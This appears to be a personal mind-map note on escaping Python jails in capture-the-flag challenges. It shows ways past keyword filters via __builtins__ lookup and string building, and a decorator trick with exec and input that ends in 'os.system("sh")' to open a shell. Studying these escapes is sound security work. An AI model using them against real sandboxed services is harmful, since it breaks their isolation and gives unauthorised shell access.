<node TEXT="Python jail" ID="ID_1984008603" CREATED="1657003654100" MODIFIED="1675117511131"><richcontent TYPE="NOTE" CONTENT-TYPE="xml/">
<html>
  <head>
    
  </head>
  <body>
    <p>
      It is a python program that allows user input. However, it restricts the input characters, keyboards or functions that can be executed
    </p>
    <p>
      
    </p>
    <p>
      For example if there are specific keywords limited, such as open or import, a way to circumvent this type of python jail is:
    </p>
    <p>
      
    </p>
    <p>
      Imagine that the word open is restricted (like that in lowercase, then there are several options:
    </p>
    <pre http-equiv="content-type" content="text/html; charset=utf-8" class="le lf lg lh gz lv bt lw">print(__builtins__.__dict__['OPEN'.lower()])  <br/>&lt;built-in function open&gt;</pre>
    <p>
      
    </p>
    <p>
      or to construct the word open and then use it
    </p>
    <p>
      &quot;o&quot;+&quot;p&quot;+&quot;e&quot;+&quot;n&quot;
    </p>
    <p>
      
    </p>
    <p>
      read more: https://anee.me/escaping-python-jails-849c65cf306e
    </p>
    <p>
      
    </p>
    <p>
      Another case is the one that restricts functions or imports:
    </p>
    <pre http-equiv="content-type" content="text/html; charset=utf-8" class="python"><code class="hljs"><font face="SansSerif" size="2">@exec@inputclass X:
    pass</font></code></pre>
    <p>
      
    </p>
    <p>
      This is equivalent to
    </p>
    <pre http-equiv="content-type" content="text/html; charset=utf-8" class="python"><code class="hljs"><font size="2">class X:
    pass
X = input(X)
X = exec(X</font>)</code></pre>
    <p>
      
    </p>
    <p>
      and then
    </p>
    <p>
      <code http-equiv="content-type" content="text/html; charset=utf-8">import os; os.system(&quot;sh&quot;)</code>
    </p>
    <p>
      gives shield!
    </p>
    <p>
      
    </p>
    <p>
      read more: https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
    </p>
  </body>
</html></richcontent>
</node>
